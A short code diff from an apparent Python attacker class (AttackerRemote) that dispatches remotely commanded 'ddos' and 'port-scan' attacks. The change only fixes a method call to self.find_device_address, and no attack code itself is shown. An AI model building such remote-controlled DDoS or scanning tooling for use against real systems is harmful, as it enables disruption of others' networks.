@@ -64,7 +64,7 @@ class AttackerRemote(AttackerBase):
             elif attack == 'ddos':
                 timeout = self.find_tag_in_msg(msg, 'timeout')
                 target = self.find_tag_in_msg(msg, 'target')
-                target = find_device_address(target)
+                target = self.find_device_address(target)
                 self._ddos_attack(timeout=timeout, target=target)
 
             elif attack == 'port-scan':
